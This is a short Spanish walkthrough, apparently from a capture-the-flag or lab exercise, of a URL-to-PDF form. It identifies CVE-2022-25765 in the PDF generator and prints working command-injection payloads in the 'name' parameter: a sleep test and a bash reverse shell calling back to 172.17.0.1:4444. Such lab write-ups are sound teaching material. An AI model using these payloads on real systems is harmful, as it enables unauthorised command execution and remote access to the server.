@@ -1,0 +1,13 @@
+	Se puede apreciar un formulario donde si añadimos una URL valida nos genera un pdf con el contenido de dicha web,
+	Ponemos una URL válida para examinar el pdf. Una vez descargado lo examinamos con alguna herramienta como exiftool,
+	vemos que este pdf ha sido creado por una herramienta determinada y vemos su versión. Si buscamos esa versión en 
+	internet vemos que contiene una vulnerabilidad de ejecución de comandos. En concreto CVE-2022-25765.
+
+	Para explotarla simplemente tenemos que poner una url valida seguido de "?name=%20``" e introducir el comando entre los acentos.
+	Vamos a probar con un sleep si se ejecutan.
+
+	http://172.17.0.1/?name=%20`sleep 10`
+
+	Vemos como la página se demora 10 segundos en responder. Finalmente podemos ejecutar una shell reversa:
+
+	http://172.17.0.1/?name=%20`bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"`
